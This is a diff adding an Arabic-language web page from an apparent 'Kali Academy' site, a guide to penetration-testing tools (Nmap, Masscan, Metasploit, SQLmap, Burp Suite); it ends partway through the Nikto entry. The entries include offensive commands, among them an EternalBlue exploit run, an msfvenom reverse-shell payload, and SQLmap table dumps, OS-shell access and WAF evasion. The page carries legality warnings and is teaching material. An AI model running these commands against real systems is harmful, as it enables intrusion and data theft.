@@ -1,0 +1,2576 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>دليل الأدوات - KaliAcademy | 100 أداة أمن سيبراني</title>
+<meta name="description" content="دليل شامل لأكثر من 100 أداة Kali Linux بشرح عربي. Nmap، Metasploit، Burp Suite، Wireshark، Aircrack، Hashcat وغيرها مع أمثلة واستخدامات.">
+<meta name="keywords" content="أدوات Kali Linux, أدوات الاختراق, Nmap, Metasploit, Burp Suite, Wireshark, أدوات أمن سيبراني">
+<meta name="robots" content="index, follow">
+<meta property="og:title" content="دليل أدوات Kali Linux - KaliAcademy">
+<meta property="og:description" content="100 أداة أمن سيبراني بشرح عربي شامل">
+<meta property="og:image" content="images/logo.png">
+<link rel="icon" type="image/png" href="images/logo.png">
+<link rel="canonical" href="tools.html">
+<link rel="stylesheet" href="css/style.css">
+<link rel="stylesheet" href="css/enhanced.css">
+<link rel="stylesheet" href="css/cyber-theme.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&family=Cairo:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+/* ===== TOOLS PAGE ===== */
+.tools-wrapper { max-width: 1500px; margin: 0 auto; padding: 0 1.5rem 4rem; }
+
+/* HERO */
+.tools-hero {
+  padding: 3rem 2rem 2.5rem; text-align: center;
+  background: linear-gradient(180deg, rgba(255,100,0,0.06) 0%, transparent 100%);
+  border-bottom: 1px solid var(--border); position: relative; overflow: hidden;
+}
+.tools-hero::before {
+  content: ''; position: absolute; top: 0; left: 0; right: 0; height: 2px;
+  background: linear-gradient(90deg, transparent, #ff6600, #ff0080, #ff6600, transparent);
+}
+.tools-hero h1 { font-family: 'Orbitron', sans-serif; font-size: clamp(1.5rem,4vw,2.5rem); font-weight: 900; color: #fff; margin: 0.5rem 0; }
+.tools-hero h1 span { color: #ff6600; }
+.tools-hero p { color: var(--text-secondary); font-size: 0.95rem; max-width: 650px; margin: 0.8rem auto 0; line-height: 1.7; }
+
+/* SEARCH */
+.tools-search-wrap { position: relative; max-width: 700px; margin: 1.5rem auto; }
+.tools-search-wrap input {
+  width: 100%; padding: 14px 55px 14px 20px;
+  background: var(--bg-card); border: 1.5px solid var(--border);
+  border-radius: 50px; color: var(--text-primary); font-size: 0.95rem;
+  font-family: 'Cairo', sans-serif; outline: none; transition: all 0.3s; direction: rtl;
+}
+.tools-search-wrap input:focus { border-color: #ff6600; box-shadow: 0 0 0 3px rgba(255,102,0,0.15); }
+.tools-search-wrap .sicon { position: absolute; left: 14px; top: 50%; transform: translateY(-50%); color: #ff6600; font-size: 1rem; }
+
+/* CATEGORY FILTER */
+.tools-cats {
+  display: flex; gap: 8px; flex-wrap: wrap;
+  padding: 1.2rem 0; border-bottom: 1px solid var(--border); margin-bottom: 2rem;
+}
+.tool-cat-btn {
+  padding: 7px 18px; border-radius: 50px; border: 1px solid var(--border);
+  background: var(--bg-card); color: var(--text-muted); cursor: pointer;
+  font-size: 0.82rem; font-family: 'Cairo', sans-serif; font-weight: 600;
+  transition: all 0.2s; white-space: nowrap;
+}
+.tool-cat-btn:hover, .tool-cat-btn.active {
+  border-color: #ff6600; color: #ff6600;
+  background: rgba(255,102,0,0.08); box-shadow: 0 0 10px rgba(255,102,0,0.15);
+}
+
+/* TOOLBAR */
+.tools-toolbar { display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 0.8rem; margin-bottom: 1.5rem; }
+.tools-count { font-family: 'Share Tech Mono', monospace; font-size: 0.82rem; color: var(--text-muted); }
+.tools-count span { color: #ff6600; font-weight: 700; }
+.tools-sort { background: var(--bg-card); border: 1px solid var(--border); color: var(--text-secondary); padding: 7px 12px; border-radius: 8px; font-family: 'Cairo', sans-serif; font-size: 0.82rem; outline: none; cursor: pointer; }
+
+/* TOOLS GRID */
+.tools-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(310px, 1fr));
+  gap: 1.2rem;
+}
+
+/* TOOL CARD */
+.tool-card {
+  background: var(--bg-card); border: 1px solid var(--border);
+  border-radius: 16px; overflow: hidden; cursor: pointer;
+  transition: all 0.3s; position: relative;
+}
+.tool-card:hover {
+  border-color: #ff6600; transform: translateY(-4px);
+  box-shadow: 0 8px 30px rgba(255,102,0,0.12);
+}
+.tool-card-top {
+  padding: 1.2rem; display: flex; align-items: flex-start; gap: 0.9rem;
+}
+.tool-logo {
+  width: 52px; height: 52px; border-radius: 12px; flex-shrink: 0;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 1.6rem; border: 1px solid rgba(255,255,255,0.1);
+}
+.tool-info { flex: 1; min-width: 0; }
+.tool-name { font-family: 'Share Tech Mono', monospace; font-size: 1rem; font-weight: 700; color: #fff; margin: 0 0 4px; }
+.tool-short { color: var(--text-muted); font-size: 0.8rem; margin: 0; line-height: 1.5; font-family: 'Cairo', sans-serif; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+
+.tool-tags { display: flex; gap: 5px; flex-wrap: wrap; padding: 0 1.2rem 0.8rem; }
+.tool-tag {
+  padding: 2px 9px; border-radius: 20px; font-size: 0.7rem; font-weight: 600;
+  font-family: 'Share Tech Mono', monospace;
+}
+.tag-recon { background: rgba(0,200,255,0.1); color: #0cf; border: 1px solid rgba(0,200,255,0.2); }
+.tag-exploit { background: rgba(255,0,128,0.1); color: #ff0080; border: 1px solid rgba(255,0,128,0.2); }
+.tag-web { background: rgba(0,150,255,0.1); color: #09f; border: 1px solid rgba(0,150,255,0.2); }
+.tag-wireless { background: rgba(150,0,255,0.1); color: #a0f; border: 1px solid rgba(150,0,255,0.2); }
+.tag-forensics { background: rgba(0,255,150,0.1); color: #0fa; border: 1px solid rgba(0,255,150,0.2); }
+.tag-password { background: rgba(255,200,0,0.1); color: #fc0; border: 1px solid rgba(255,200,0,0.2); }
+.tag-network { background: rgba(0,255,65,0.1); color: #0f4; border: 1px solid rgba(0,255,65,0.2); }
+.tag-malware { background: rgba(255,80,0,0.1); color: #f50; border: 1px solid rgba(255,80,0,0.2); }
+.tag-privesc { background: rgba(255,50,50,0.1); color: #f55; border: 1px solid rgba(255,50,50,0.2); }
+.tag-ctf { background: rgba(100,255,200,0.1); color: #6fe; border: 1px solid rgba(100,255,200,0.2); }
+.tag-social { background: rgba(255,150,200,0.1); color: #f9c; border: 1px solid rgba(255,150,200,0.2); }
+.tag-linux { background: rgba(200,200,255,0.1); color: #ccf; border: 1px solid rgba(200,200,255,0.2); }
+
+.tool-footer { padding: 0.7rem 1.2rem; border-top: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; background: rgba(0,0,0,0.2); }
+.tool-install { font-size: 0.75rem; color: var(--text-muted); font-family: 'Share Tech Mono', monospace; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; flex: 1; }
+.tool-open-btn { font-size: 0.78rem; color: #ff6600; flex-shrink: 0; margin-right: 0.5rem; }
+
+/* MODAL */
+.tool-modal-overlay {
+  position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+  background: rgba(0,0,0,0.93); z-index: 5000;
+  display: flex; align-items: flex-start; justify-content: center;
+  padding: 1rem; overflow-y: auto; backdrop-filter: blur(6px);
+  animation: toolFadeIn 0.2s ease;
+}
+@keyframes toolFadeIn { from{opacity:0} to{opacity:1} }
+.tool-modal {
+  background: var(--bg-dark); border: 1px solid rgba(255,102,0,0.3);
+  border-radius: 20px; max-width: 900px; width: 100%;
+  margin: auto; box-shadow: 0 0 60px rgba(255,102,0,0.1);
+  animation: toolSlideUp 0.3s cubic-bezier(0.16,1,0.3,1);
+}
+@keyframes toolSlideUp { from{opacity:0;transform:translateY(30px)} to{opacity:1;transform:translateY(0)} }
+
+.tool-modal-hdr {
+  position: sticky; top: 0; background: var(--bg-dark); z-index: 10;
+  padding: 1.2rem 1.5rem; border-bottom: 1px solid var(--border);
+  display: flex; align-items: center; gap: 1rem;
+}
+.tool-modal-icon { width: 48px; height: 48px; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 1.5rem; flex-shrink: 0; }
+.tool-modal-title { flex: 1; }
+.tool-modal-title h2 { font-family: 'Share Tech Mono', monospace; font-size: 1.2rem; color: #fff; margin: 0 0 2px; }
+.tool-modal-title p { color: var(--text-muted); font-size: 0.82rem; margin: 0; font-family: 'Cairo', sans-serif; }
+.tool-modal-close { width: 36px; height: 36px; border-radius: 50%; background: rgba(255,50,50,0.1); border: 1px solid rgba(255,50,50,0.3); color: #ff6666; cursor: pointer; display: flex; align-items: center; justify-content: center; font-size: 1rem; transition: all 0.2s; flex-shrink: 0; }
+.tool-modal-close:hover { background: rgba(255,50,50,0.25); }
+.tool-modal-body { padding: 1.5rem; }
+
+/* Sections inside modal */
+.modal-section { margin-bottom: 1.8rem; }
+.modal-section-title {
+  font-family: 'Orbitron', sans-serif; font-size: 0.8rem; font-weight: 700;
+  color: #ff6600; text-transform: uppercase; letter-spacing: 2px;
+  margin-bottom: 0.9rem; display: flex; align-items: center; gap: 0.5rem;
+}
+.modal-section-title::after { content:''; flex:1; height:1px; background:rgba(255,102,0,0.2); }
+
+.modal-desc { color: var(--text-secondary); font-family: 'Cairo', sans-serif; font-size: 0.9rem; line-height: 1.8; margin-bottom: 1rem; }
+
+/* Features list */
+.modal-features { list-style: none; padding: 0; margin: 0; display: flex; flex-direction: column; gap: 6px; }
+.modal-features li { display: flex; align-items: flex-start; gap: 0.6rem; color: var(--text-secondary); font-family: 'Cairo', sans-serif; font-size: 0.85rem; line-height: 1.6; }
+.modal-features li::before { content:'▸'; color: #ff6600; flex-shrink: 0; margin-top: 1px; }
+
+/* Command blocks */
+.modal-cmd {
+  background: #060d12; border: 1px solid #1a2a1a; border-right: 3px solid #ff6600;
+  border-radius: 8px; padding: 0.7rem 1rem;
+  display: flex; align-items: center; justify-content: space-between; gap: 0.5rem;
+  margin-bottom: 0.6rem;
+}
+.modal-cmd code { font-family: 'Share Tech Mono', monospace; font-size: 0.84rem; color: #ff9944; white-space: pre; overflow-x: auto; flex: 1; }
+.modal-cmd .mc-note { display: block; color: var(--text-muted); font-size: 0.74rem; margin-top: 3px; font-family: 'Cairo', sans-serif; white-space: normal; }
+.copy-modal-btn { flex-shrink: 0; background: rgba(255,102,0,0.1); border: 1px solid rgba(255,102,0,0.3); color: #ff6600; padding: 3px 10px; border-radius: 6px; cursor: pointer; font-size: 0.72rem; transition: all 0.2s; white-space: nowrap; }
+.copy-modal-btn:hover { background: rgba(255,102,0,0.25); }
+
+/* Install block */
+.install-box { background: rgba(0,255,65,0.05); border: 1px solid rgba(0,255,65,0.2); border-radius: 10px; padding: 1rem; }
+.install-cmd { font-family: 'Share Tech Mono', monospace; color: #00ff41; font-size: 0.85rem; margin: 4px 0; }
+
+/* Tips/Warnings */
+.modal-tip { background: rgba(0,255,65,0.05); border: 1px solid rgba(0,255,65,0.2); border-right: 3px solid #00ff41; border-radius: 8px; padding: 0.6rem 1rem; margin-bottom: 0.6rem; color: #88ffaa; font-size: 0.82rem; font-family: 'Cairo', sans-serif; line-height: 1.6; }
+.modal-warning { background: rgba(255,80,0,0.07); border: 1px solid rgba(255,80,0,0.25); border-right: 3px solid #ff8800; border-radius: 8px; padding: 0.6rem 1rem; margin-bottom: 0.6rem; color: #ffaa66; font-size: 0.82rem; font-family: 'Cairo', sans-serif; line-height: 1.6; }
+
+/* Related tools */
+.related-tools { display: flex; gap: 8px; flex-wrap: wrap; }
+.related-tool-btn { padding: 5px 14px; background: rgba(255,102,0,0.08); border: 1px solid rgba(255,102,0,0.25); border-radius: 20px; color: #ff9944; font-size: 0.78rem; font-family: 'Share Tech Mono', monospace; cursor: pointer; transition: all 0.2s; }
+.related-tool-btn:hover { background: rgba(255,102,0,0.2); color: #ff6600; }
+
+/* NO RESULTS */
+.no-tools { text-align: center; padding: 5rem 2rem; color: var(--text-muted); font-family: 'Cairo', sans-serif; }
+.no-tools span { font-size: 3rem; display: block; margin-bottom: 1rem; }
+
+/* NOTIFICATION */
+#tool-notif { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%) translateY(20px); opacity: 0; background: rgba(255,102,0,0.95); color: #fff; padding: 10px 24px; border-radius: 30px; font-family: 'Cairo', sans-serif; font-size: 0.85rem; z-index: 9999; transition: all 0.3s; pointer-events: none; white-space: nowrap; }
+#tool-notif.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+
+@media (max-width: 640px) {
+  .tools-grid { grid-template-columns: 1fr; }
+  .tool-modal-hdr { flex-wrap: wrap; }
+}
+</style>
+</head>
+<body class="grid-bg">
+<script src="js/disclaimer.js"></script>
+<script src="js/social-bar.js"></script>
+<script src="js/site-init.js"></script>
+<canvas id="matrix-canvas"></canvas>
+
+<!-- HEADER -->
+<header class="site-header">
+  <a href="index.html" class="logo">
+    <div class="logo-icon"><img src="images/logo.png" alt="Kali Academy Logo" style="width:44px;height:44px;object-fit:contain;"></div>
+    <div><span class="logo-text">KALI ACADEMY</span><span class="logo-sub">CYBER SECURITY LEARNING</span></div>
+  </a>
+  <ul class="nav-menu">
+    <li><a href="index.html" class="nav-link"><i class="fas fa-home"></i> الرئيسية</a></li>
+    <li><a href="commands.html" class="nav-link"><i class="fas fa-terminal"></i> الأوامر</a></li>
+    <li><a href="tutorials.html" class="nav-link"><i class="fas fa-book-open"></i> الدروس</a></li>
+    <li><a href="steps.html" class="nav-link"><i class="fas fa-list-ol"></i> خطوات التنفيذ</a></li>
+    <li><a href="tools.html" class="nav-link active"><i class="fas fa-tools"></i> الأدوات</a></li>
+    
+  </ul><div class="status-dot"></div><span>SYSTEM ONLINE</span></div>
+  <div class="hamburger"><span></span><span></span><span></span></div>
+</header>
+<div class="mobile-menu">
+  <a href="index.html" class="nav-link mobile-nav-link"><i class="fas fa-home"></i> الرئيسية</a>
+  <a href="commands.html" class="nav-link mobile-nav-link"><i class="fas fa-terminal"></i> الأوامر</a>
+  <a href="tutorials.html" class="nav-link mobile-nav-link"><i class="fas fa-book-open"></i> الدروس</a>
+  <a href="steps.html" class="nav-link mobile-nav-link"><i class="fas fa-list-ol"></i> خطوات التنفيذ</a>
+  <a href="tools.html" class="nav-link mobile-nav-link active"><i class="fas fa-tools"></i> الأدوات</a>
+  
+</div>
+  <!-- HERO -->
+  <div class="tools-hero">
+    <div class="search-count-badge" style="margin-bottom:0.8rem;">
+      <i class="fas fa-tools"></i> <span id="tools-total-badge">0</span> أداة موثقة
+    </div>
+    <h1>دليل <span>الأدوات</span></h1>
+    <p>الدليل الشامل لأشهر أدوات الأمن السيبراني واختبار الاختراق — شرح مفصل، أوامر عملية، وأمثلة تطبيقية لكل أداة</p>
+    <div class="tools-search-wrap">
+      <input type="text" id="toolSearch" placeholder="ابحث عن أداة... (Nmap, Metasploit, Burp Suite...)" oninput="filterTools()">
+      <i class="fas fa-search sicon"></i>
+    </div>
+  </div>
+
+  <!-- CATEGORY FILTER -->
+  <div class="tools-cats" id="toolsCats">
+    <button class="tool-cat-btn active" data-cat="all" onclick="setCat('all',this)">🌐 الكل</button>
+    <button class="tool-cat-btn" data-cat="scanning" onclick="setCat('scanning',this)">🔍 المسح</button>
+    <button class="tool-cat-btn" data-cat="exploitation" onclick="setCat('exploitation',this)">💥 الاستغلال</button>
+    <button class="tool-cat-btn" data-cat="web" onclick="setCat('web',this)">🌐 ويب</button>
+    <button class="tool-cat-btn" data-cat="wireless" onclick="setCat('wireless',this)">📡 WiFi</button>
+    <button class="tool-cat-btn" data-cat="password" onclick="setCat('password',this)">🔑 كلمات مرور</button>
+    <button class="tool-cat-btn" data-cat="forensics" onclick="setCat('forensics',this)">🔬 جنائي</button>
+    <button class="tool-cat-btn" data-cat="recon" onclick="setCat('recon',this)">👁️ استطلاع</button>
+    <button class="tool-cat-btn" data-cat="network" onclick="setCat('network',this)">🌐 شبكات</button>
+    <button class="tool-cat-btn" data-cat="malware" onclick="setCat('malware',this)">🦠 برمجيات خبيثة</button>
+    <button class="tool-cat-btn" data-cat="privesc" onclick="setCat('privesc',this)">⬆️ صلاحيات</button>
+    <button class="tool-cat-btn" data-cat="social" onclick="setCat('social',this)">🎭 هندسة اجتماعية</button>
+    <button class="tool-cat-btn" data-cat="ctf" onclick="setCat('ctf',this)">🏆 CTF</button>
+  </div>
+
+  <!-- TOOLBAR -->
+  <div class="tools-toolbar">
+    <div class="tools-count">عرض <span id="shown-count">0</span> من <span id="total-count">0</span> أداة</div>
+    <select class="tools-sort" onchange="sortTools(this.value)" id="toolsSort">
+      <option value="default">ترتيب افتراضي</option>
+      <option value="name">أبجدي</option>
+      <option value="cat">حسب الفئة</option>
+    </select>
+  </div>
+
+  <!-- GRID -->
+  <div class="tools-grid" id="toolsGrid"></div>
+  <div class="no-tools" id="noTools" style="display:none;">
+    <span>🔧</span>
+    <h3>لا توجد أدوات مطابقة</h3>
+    <p>جرب كلمات بحث مختلفة أو اختر فئة أخرى</p>
+  </div>
+</div>
+
+<!-- MODAL -->
+<div class="tool-modal-overlay" id="toolModal" style="display:none;" onclick="closeToolModal(event)">
+  <div class="tool-modal" id="toolModalInner">
+    <div class="tool-modal-hdr">
+      <div class="tool-modal-icon" id="mIcon"></div>
+      <div class="tool-modal-title">
+        <h2 id="mName"></h2>
+        <p id="mShort"></p>
+      </div>
+      <button class="tool-modal-close" onclick="closeToolModalDirect()">✕</button>
+    </div>
+    <div class="tool-modal-body" id="mBody"></div>
+  </div>
+</div>
+
+<!-- NOTIFICATION -->
+<div id="tool-notif"></div>
+
+<!-- FOOTER -->
+<footer class="site-footer">
+  <div class="footer-bottom" style="max-width:1500px;margin:0 auto;text-align:center;padding:1.5rem 2rem;font-size:0.8rem;color:var(--text-muted);">
+    ⚠️ للأغراض التعليمية والبحثية فقط | © 2026 Kali Academy |
+<a href="disclaimer-owner.html" style="color:#ff9966;text-decoration:none;"> ⚖️ إخلاء المسؤولية</a>
+  </div>
+</footer>
+
+<script src="js/matrix.js"></script>
+<script>
+// ============================================================
+// TOOLS DATABASE
+// ============================================================
+const TOOLS = [
+
+// ============================================================
+// SCANNING & RECONNAISSANCE
+// ============================================================
+{
+  id: 1, name: 'Nmap', icon: '🗺️', color: 'rgba(0,255,65,0.12)',
+  short: 'أداة مسح الشبكات والمنافذ الأكثر شعبية في العالم',
+  cat: 'scanning', tags: ['scanning','recon','network'],
+  desc: `Nmap (Network Mapper) هي أداة مفتوحة المصدر تُستخدم لاكتشاف الشبكات وتدقيق الأمان. تُعتبر أداة أساسية لكل متخصص في الأمن السيبراني، إذ تتيح رسم خريطة كاملة للشبكة، اكتشاف الأجهزة المتصلة، تحديد المنافذ المفتوحة، واكتشاف الخدمات والإصدارات. كتبها Gordon Lyon ونُشرت عام 1997، وهي اليوم من أكثر أدوات الأمن استخداماً في العالم.`,
+  features: [
+    'مسح المنافذ: اكتشاف أي منافذ مفتوحة على الهدف (TCP/UDP)',
+    'اكتشاف الخدمات: تحديد الخدمة والإصدار على كل منفذ',
+    'اكتشاف نظام التشغيل: محاولة تحديد OS الهدف بدقة عالية',
+    'Scripting Engine (NSE): تشغيل سكريبتات متخصصة لفحص الثغرات',
+    'Traceroute: رسم مسار الحزم حتى الهدف',
+    'مسح IPv4 و IPv6 والشبكات الكاملة /24، /16',
+  ],
+  install: 'sudo apt install nmap -y',
+  version: 'nmap --version',
+  commands: [
+    { cmd: 'nmap 192.168.1.1', note: 'مسح بسيط للمنافذ الـ 1000 الأكثر شيوعاً' },
+    { cmd: 'nmap -sV -sC 192.168.1.1', note: 'مسح مع اكتشاف الخدمات والإصدارات + scripts افتراضية' },
+    { cmd: 'nmap -p 1-65535 -sV 192.168.1.1', note: 'مسح جميع المنافذ (65535 منفذ)' },
+    { cmd: 'nmap -O 192.168.1.1', note: 'محاولة اكتشاف نظام التشغيل' },
+    { cmd: 'nmap -A 192.168.1.1', note: 'مسح شامل: OS + خدمات + scripts + traceroute' },
+    { cmd: 'nmap -sU -p 53,67,68,161 192.168.1.1', note: 'مسح منافذ UDP محددة' },
+    { cmd: 'nmap -sn 192.168.1.0/24', note: 'اكتشاف الأجهزة الحية فقط (Ping Scan)' },
+    { cmd: 'nmap --script vuln 192.168.1.1', note: 'فحص الثغرات المعروفة باستخدام NSE' },
+    { cmd: 'nmap -oN output.txt -oX output.xml 192.168.1.1', note: 'حفظ النتائج بصيغة نصية و XML' },
+    { cmd: 'nmap -T4 -F 192.168.1.0/24', note: 'مسح سريع للشبكة بأكملها' },
+  ],
+  tips: [
+    '💡 استخدم -T4 أو -T5 لمسح أسرع في الشبكات الداخلية',
+    '💡 السكريبت --script vuln يكشف ثغرات مثل EternalBlue وشلك',
+    '⚠️ لا تمسح شبكات لا تملكها — اكتشاف المسح قد يُنبّه IDSs',
+  ],
+  related: ['Masscan', 'Zenmap', 'Unicornscan', 'Netcat'],
+},
+
+{
+  id: 2, name: 'Masscan', icon: '⚡', color: 'rgba(255,200,0,0.12)',
+  short: 'أسرع ماسح منافذ في العالم — يمسح الإنترنت بأكمله في 6 دقائق',
+  cat: 'scanning', tags: ['scanning','network'],
+  desc: `Masscan هو ماسح منافذ غير متزامن يستطيع إرسال ملايين الحزم في الثانية. طوّره Robert Graham عام 2013. يمكنه مسح الإنترنت بأكمله (4.3 مليار IP) في أقل من 6 دقائق. يعمل بطريقة مختلفة عن Nmap — لا يعتمد على kernel TCP stack، بل لديه stack خاص به.`,
+  features: [
+    'سرعة قصوى: حتى 25 مليون حزمة/ثانية',
+    'مسح شبكات كبيرة جداً بسرعة مذهلة',
+    'متوافق مع إخراج Nmap (XML)',
+    'دعم UDP و TCP و SCTP',
+    'قابل للتخصيص الكامل للمنافذ والشبكات',
+  ],
+  install: 'sudo apt install masscan -y',
+  version: 'masscan --version',
+  commands: [
+    { cmd: 'masscan 192.168.1.0/24 -p 80,443,22', note: 'مسح شبكة كاملة على منافذ محددة' },
+    { cmd: 'masscan 10.0.0.0/8 -p 0-65535 --rate=100000', note: 'مسح شبكة ضخمة بسرعة 100k حزمة/ثانية' },
+    { cmd: 'masscan 192.168.1.0/24 -p 80 -oX results.xml', note: 'حفظ النتائج بصيغة XML' },
+    { cmd: 'masscan --resume paused.conf', note: 'استئناف مسح متوقف' },
+  ],
+  tips: [
+    '⚠️ قد يُسبب Masscan عطلاً في الشبكة بسبب سرعته — استخدمه بحذر',
+    '💡 استخدم Masscan للاكتشاف السريع ثم Nmap للتفاصيل',
+  ],
+  related: ['Nmap', 'Zmap', 'Unicornscan'],
+},
+
+// ============================================================
+// EXPLOITATION
+// ============================================================
+{
+  id: 3, name: 'Metasploit', icon: '💥', color: 'rgba(255,0,128,0.12)',
+  short: 'إطار الاستغلال الأشهر في تاريخ اختبار الاختراق',
+  cat: 'exploitation', tags: ['exploit','privesc'],
+  desc: `Metasploit Framework هو إطار عمل مفتوح المصدر لاختبار الاختراق طوّرته شركة Rapid7. يحتوي على أكثر من 2000 استغلال موثق (exploit) و500+ وحدة مساعدة (auxiliary)، مما يجعله الأداة الأكثر استخداماً في مجال اختبار الاختراق الاحترافي. يوفر بيئة متكاملة لاختبار الثغرات، تطوير Exploits، وإدارة جلسات الاختراق (Sessions).`,
+  features: [
+    '2000+ exploit جاهز لثغرات Windows، Linux، macOS وغيرها',
+    'Meterpreter: Shell متقدم يعمل في الذاكرة دون لمس القرص',
+    'Armitage: واجهة رسومية لـ Metasploit',
+    'دعم الشبكات الداخلية عبر Pivoting و Port Forwarding',
+    'Evasion Modules: تجاوز أنظمة الحماية',
+    'دمج مع Nmap و Nessus لاستيراد النتائج',
+  ],
+  install: 'sudo apt install metasploit-framework -y',
+  version: 'msfconsole -v',
+  commands: [
+    { cmd: 'msfconsole', note: 'فتح Metasploit Console' },
+    { cmd: 'search ms17-010', note: 'البحث عن exploits خاصة بثغرة معينة' },
+    { cmd: 'use exploit/windows/smb/ms17_010_eternalblue', note: 'تحميل exploit معين' },
+    { cmd: 'set RHOSTS 192.168.1.10\nset LHOST 192.168.1.5\nrun', note: 'ضبط الهدف والمستمع وتشغيل الاستغلال' },
+    { cmd: 'sessions -l', note: 'عرض جلسات Meterpreter النشطة' },
+    { cmd: 'sessions -i 1', note: 'الدخول لجلسة Meterpreter رقم 1' },
+    { cmd: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe > payload.exe', note: 'إنشاء payload مخصص' },
+    { cmd: 'db_nmap -sV 192.168.1.0/24', note: 'تشغيل Nmap من داخل Metasploit مع حفظ النتائج' },
+  ],
+  tips: [
+    '💡 استخدم auxiliary/scanner/* لمسح الأنظمة واكتشاف الخدمات',
+    '💡 Meterpreter أقوى بكثير من Shell العادي — يدعم الرفع والتنزيل والتصوير',
+    '⚠️ استخدام Metasploit على أنظمة غير مرخصة جريمة جنائية',
+  ],
+  related: ['msfvenom', 'Armitage', 'BeEF', 'SQLmap'],
+},
+
+{
+  id: 4, name: 'SQLmap', icon: '💉', color: 'rgba(255,100,0,0.12)',
+  short: 'أداة حقن SQL التلقائية الأقوى في العالم',
+  cat: 'web', tags: ['web','exploit'],
+  desc: `SQLmap هي أداة مفتوحة المصدر لاكتشاف واستغلال ثغرات SQL Injection تلقائياً. تدعم أكثر من 30 نظام قواعد بيانات (MySQL، PostgreSQL، Oracle، MSSQL...وغيرها). تستطيع استخراج قواعد البيانات، الجداول، المستخدمين، وكلمات المرور، بل وتنفيذ أوامر على نظام التشغيل عبر ثغرات SQL.`,
+  features: [
+    'اكتشاف ثلاثة أنواع SQL Injection: Error-based, Blind, Time-based',
+    'دعم 30+ محرك قواعد بيانات',
+    'استخراج البيانات: قواعد بيانات، جداول، حقول، صفوف',
+    'كسر كلمات المرور المشفرة (Hash Cracking)',
+    'تنفيذ أوامر OS عبر xp_cmdshell (MSSQL)',
+    'رفع وتنزيل الملفات من/إلى الخادم',
+    'فتح Webshell أو Meterpreter shell',
+  ],
+  install: 'sudo apt install sqlmap -y',
+  version: 'sqlmap --version',
+  commands: [
+    { cmd: 'sqlmap -u "http://site.com/page.php?id=1" --dbs', note: 'استخراج قائمة قواعد البيانات' },
+    { cmd: 'sqlmap -u "http://site.com/page.php?id=1" -D dbname --tables', note: 'استخراج جداول قاعدة بيانات محددة' },
+    { cmd: 'sqlmap -u "http://site.com/page.php?id=1" -D dbname -T users --dump', note: 'تفريغ محتوى جدول المستخدمين' },
+    { cmd: 'sqlmap -u "http://site.com/login" --data="user=admin&pass=test" --dbs', note: 'اختبار POST request' },
+    { cmd: 'sqlmap -u "http://site.com/page.php?id=1" --os-shell', note: 'الحصول على shell في نظام التشغيل' },
+    { cmd: 'sqlmap -u "http://site.com/page.php?id=1" --level=5 --risk=3', note: 'مسح عميق بكل أنواع الحقن' },
+    { cmd: 'sqlmap -r request.txt --dbs', note: 'اختبار من ملف Burp Suite HTTP request' },
+  ],
+  tips: [
+    '💡 احفظ طلب HTTP من Burp Suite واستخدم -r لاختباره مع SQLmap',
+    '💡 --tamper=space2comment للتحايل على WAF',
+    '⚠️ لا تستخدم على مواقع لا تملك إذناً كتابياً باختبارها',
+  ],
+  related: ['Havij', 'Burp Suite', 'OWASP ZAP', 'Nikto'],
+},
+
+// ============================================================
+// WEB APPLICATION
+// ============================================================
+{
+  id: 5, name: 'Burp Suite', icon: '🕷️', color: 'rgba(255,150,0,0.12)',
+  short: 'منصة اختبار أمان تطبيقات الويب الاحترافية',
+  cat: 'web', tags: ['web'],
+  desc: `Burp Suite هو إطار عمل احترافي لاختبار أمان تطبيقات الويب طوّرته شركة PortSwigger. يعمل كـ Proxy يعترض ويعدل الطلبات بين المتصفح والخادم. يُعتبر أداة لا غنى عنها في كل Bug Bounty Hunter ومختبر اختراق. يتوفر بإصدارات: Community (مجاني)، Professional (مدفوع)، Enterprise.`,
+  features: [
+    'Proxy: اعتراض وتعديل كل HTTP/HTTPS request',
+    'Scanner: فحص تلقائي لثغرات OWASP Top 10',
+    'Repeater: إعادة إرسال الطلبات وتعديلها يدوياً',
+    'Intruder: هجمات Fuzzing وBrute Force على الويب',
+    'Decoder: فك/تشفير Base64, URL, HTML وغيرها',
+    'Comparer: مقارنة استجابتين لاكتشاف الفروق',
+    'Sequencer: تحليل عشوائية الـ Tokens',
+  ],
+  install: 'sudo apt install burpsuite -y  # أو تحميل من portswigger.net',
+  version: 'burpsuite &',
+  commands: [
+    { cmd: 'burpsuite &', note: 'تشغيل Burp Suite بالخلفية' },
+    { cmd: '# إعداد Proxy: Firefox → Proxy → Manual → 127.0.0.1:8080', note: 'ضبط المتصفح للعمل مع Burp' },
+    { cmd: '# Intercept → On → تصفح الموقع → Forward الطلبات', note: 'اعتراض الطلبات' },
+    { cmd: '# Click على Request → Send to Repeater → تعديل وإرسال', note: 'إرسال طلب لـ Repeater' },
+    { cmd: '# Send to Intruder → Positions → Sniper → Wordlist', note: 'هجوم Brute Force' },
+  ],
+  tips: [
+    '💡 ثبّت شهادة Burp CA في المتصفح لاعتراض HTTPS',
+    '💡 استخدم FoxyProxy لتبديل الـ Proxy بسرعة',
+    '💡 Extensions مفيدة: Active Scan++, Logger++, Retire.js',
+  ],
+  related: ['OWASP ZAP', 'mitmproxy', 'SQLmap', 'Nikto'],
+},
+
+{
+  id: 6, name: 'Nikto', icon: '🔎', color: 'rgba(0,200,255,0.12)',
+  short: 'ماسح ثغرات خوادم الويب الكلاسيكي',
+  cat: 'web', tags: ['web','scanning'],
